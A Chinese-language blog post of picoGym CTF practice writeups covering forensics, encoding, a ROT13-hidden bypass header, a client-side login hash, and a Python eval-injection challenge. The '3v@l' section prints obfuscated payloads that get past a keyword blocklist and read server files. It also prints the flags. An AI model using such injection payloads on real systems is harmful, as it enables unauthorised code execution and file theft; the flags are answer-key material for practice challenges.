---
title: picoGym Writeups (1)
date: 2025-11-01T19:03:44+08:00
tags:
---

[picoGym](https://play.picoctf.org/practice/) 难度偏易，适合给人提供信心。

是一个 non-competitive 的 CTF 练习平台

打算当练习场玩玩（复健.jpg），这里打算随缘记记writeup，不过难度不大（可能记录的意义也不大）


<!-- more -->

# Riddle Registry

Easy | Category: Forensics | `picoCTF{puzzl3d_m3tadata_f0und!_c8f91d68}`

下载提供的`confidential.pdf`，直接查看metadata，作者为`cGljb0NURntwdXp6bDNkX20zdGFkYXRhX2YwdW5kIV9jOGY5MWQ2OH0=`，base64解码后即为flag。

# Crack the Gate 1

Easy | Category: Web Exploitation | `picoCTF{brut4_f0rc4_7e5db33b}`

源代码中找到hint

```html
 <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->   
```

ROT13解码后为`NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"`，在请求头中添加该字段并设置为`yes`即可通过验证，得到flag。

```http
POST http://amiable-citadel.picoctf.net:56557/login HTTP/1.1
X-Dev-Access: yes
Content-Type: application/json

{"email":"ctf-player@picoctf.org","password":"mypassword"}

# picoCTF{brut4_f0rc4_7e5db33b}
```


# Local Authority

Easy | Category: Web Exploitation | `picoCTF{j5_15_7r4n5p4r3n7_a8788e61}`

`/`:

```html

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Secure Customer Portal</title>
  </head>
  <body>

    <h1>Secure Customer Portal</h1>
    
   <p>Only letters and numbers allowed for username and password.</p>
    
    <form role="form" action="login.php" method="post">
      <input type="text" name="username" placeholder="Username" required 
       autofocus></br>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" name="login">Login</button>
    </form>
  </body>
</html>
```

欸，你以为是动态验证？但其实不是

`login.php`:

```html

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Login Page</title>
  </head>
  <body>
    <script src="secure.js"></script>
    
    <p id='msg'></p>
    
    <form hidden action="admin.php" method="post" id="hiddenAdminForm">
      <input type="text" name="hash" required id="adminFormHash">
    </form>
    
    <script type="text/javascript">
      function filter(string) {
        filterPassed = true;
        for (let i =0; i < string.length; i++){
          cc = string.charCodeAt(i);
          
          if ( (cc >= 48 && cc <= 57) ||
               (cc >= 65 && cc <= 90) ||
               (cc >= 97 && cc <= 122) )
          {
            filterPassed = true;     
          }
          else
          {
            return false;
          }
        }
        
        return true;
      }
    
      window.username = "aa";
      window.password = "aaa";
      
      usernameFilterPassed = filter(window.username);
      passwordFilterPassed = filter(window.password);
      
      if ( usernameFilterPassed && passwordFilterPassed ) {
      
        loggedIn = checkPassword(window.username, window.password);
        
        if(loggedIn)
        {
          document.getElementById('msg').innerHTML = "Log In Successful";
          document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
          document.getElementById('hiddenAdminForm').submit();
        }
        else
        {
          document.getElementById('msg').innerHTML = "Log In Failed";
        }
      }
      else {
        document.getElementById('msg').innerHTML = "Illegal character in username or password."
      }
    </script>
    
  </body>
</html>
```

直接把hash提交到`admin.php`即可

# repetitions

Easy | Category: General Skills | `picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_492767d2}`

```
VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh
RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk
MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW
VkpEVGxaYVdFMVhSbFZrTTBKVVZXcE9VazFXV2toT1dHUllDbUY2UWpSWk1GWlhWa2RHZEdWRlZs
aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==
```

[直接持续进行base64解码，直到得到flag。](https://lab.tonycrane.cc/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=Vm1wR1UxRXlSWGxVV0d4VFlteEtWVll3WkZOV2JHeHlWMjFHVjFKdGVEQlViRnBQWVd4S2RGVnNhRnBXVmxVeFdWWmFTMVpXV25WaA0KUm1SWFpXdGFiMWRXV210U01rNXlUbFpXV0FwaVZWcFVWbTEwZDFWV1pGZFZhMlJwWWxaYVdGWnROVmRWWjNCcFUwVktlbGRXVWtOaw0KTWxaWFZsaG9XR0pZUWs5VmJGSlhVMFprY1ZSdVRsZGFNMEpaVldwR1MyVldXa2RhU0dSWENrMXNXbnBXVjNoaFZtMUtSazVYT1ZWVw0KVmtwRVZHeGFZVmRGTVZoU2JGWnJUVEJLVlZaWGNFOVZhekZYVjJ0b1QxZEhVbGxEYlVZMlVXcFNXazFHV2xoV2EyUkhaRWRXUmxacw0KYUdrS1lsUnJlbFpFUmxkVU1rcHpVV3hXVGxKWVRreERaejA5Q2c9PQ0K&ieol=CRLF)

# Bases

Easy | Category: General Skills | `picoCTF{l3arn_th3_r0p35}`

[recipe](https://lab.tonycrane.cc/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=YkROaGNtNWZkR2d6WDNJd2NETTE&ieol=CRLF)

# Hidden in plainsight

Easy | Category: Forensics | `picoCTF{h1dd3n_1n_1m4g3_656e4d79}`

下载`img.png`，发现comment data:

```
Comment data Length: 1e (30) 
Dump of data: 
Hex: 001e6333526c5a32 68705a4755365930 56474e6d56755a48 5a6a62564539 
Ascii: ..c3RlZ2 hpZGU6Y0 VGNmVuZH ZjbVE9
```

base64解码得到`steghide:cEF6endvcmQ=`, 冒号后面再解码得到`pAzzword`,

用`steghide`提取隐藏数据：

```bash
steghide extract -sf img.png -p pAzzword
```

得到`flag.txt`，内容即为flag。

# Scan Surprise

Easy | Category: Forensics | `picoCTF{p33k_@_b00_0194a007}`

just [scan it](https://lab.tonycrane.cc/CyberChef/#recipe=Parse_QR_Code(false)&input=iVBORw0KGgoAAAANSUhEUgAAAGMAAABjAQMAAAC19SzWAAAABlBMVEUAAAD///%2Bl2Z/dAAAAAnRSTlP//8i138cAAAAJcEhZcwAACxIAAAsSAdLdfvwAAADySURBVDiNzdSxjcQgEAXQsQgIrwEk2iCjJdMArBtYt0RGG0huALIN0M4NWu36EjPogtMR%2BRHY85nBgD8X/GMVgBWOGmHhVLGFB4RED5yi8ubYErgJhahxVmJK2LzJ7qzsUpTPJeXOtJeiVeyxnyd4qWIoH27vLwz0tGKPeLcqcKqpraaBVI7TU2oqZMfMCh/KQ/OyFz5WsaJGUSwEXnm1Ykt641SRatG051jF7CEDiI1T74OkEXid2UjUW29gSbpy6vMi6fWCV%2BwduIH6mtBq9B3yMiGal2LeaQdCmgJ9s5%2Bbeqk%2B15HCve7KSH/9J/qdvgH4hKgxpryTJAAAAABJRU5ErkJggg&oeol=CR)

# 3v@l

Medium | Category: Web Exploitation | `picoCTF{D0nt_Use_Unsecure_f@nctions6adf3843}`


`__import__("o"+"s").popen("l"+"s "+chr(47)).read()`

Result: `app bin boot challenge dev etc flag.txt home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var`

还可以直接把app.py读出来看一下：

`__import__("o"+"s").popen("c"+"at "+"app"+chr(46)+"py").read()`

```python
from flask import Flask, request, render_template_string, render_template
import re

app = Flask(__name__)

# Define blocklist keywords and regex for file paths
BLOCKLIST_KEYWORDS = ['os', 'eval', 'exec', 'bind', 'connect', 'python','python3', 'socket', 'ls', 'cat', 'shell', 'bind']
FILE_PATH_REGEX = r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'


@app.route('/')
def index():
    return render_template('index.html/')

@app.route('/execute', methods=['POST'])
def execute():
    code = request.form['code']

    # Check for blocklist keywords in submitted code
    for keyword in BLOCKLIST_KEYWORDS:
        if keyword in code:
            return render_template('error.html', keyword=keyword)

    # Check for file path using regex
    if re.search(FILE_PATH_REGEX, code):
        return render_template('error.html')

    try:
        # Execute the Python code if no blocklist keyword or file path found
        result = eval(code)
    except Exception as e:
        result = f"Error: {str(e)}"

    return render_template('result.html', result=result)

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=5000)
```

用`__import__("o"+"s").popen("c"+"at "+chr(47)+"fla"+"g"+chr(46)+"txt").read()`

得到flag。


# Time Machine

Easy | Category: General Skills | `picoCTF{t1m3m@ch1n3_8defe16a}`

在commit message里面

```
Author: picoCTF <ops@picoctf.com>  2024-03-12 08:07:24
Committer: picoCTF <ops@picoctf.com>  2024-03-12 08:07:24
Branch: master
Follows: 
Precedes: 

    picoCTF{t1m3m@ch1n3_8defe16a}

--------------------------------- message.txt ---------------------------------
new file mode 100644
index 0000000..4324621
@@ -0,0 +1 @@
+This is what I was working on, but I'd need to look at my commit history to know why...
\ No newline at end of file
```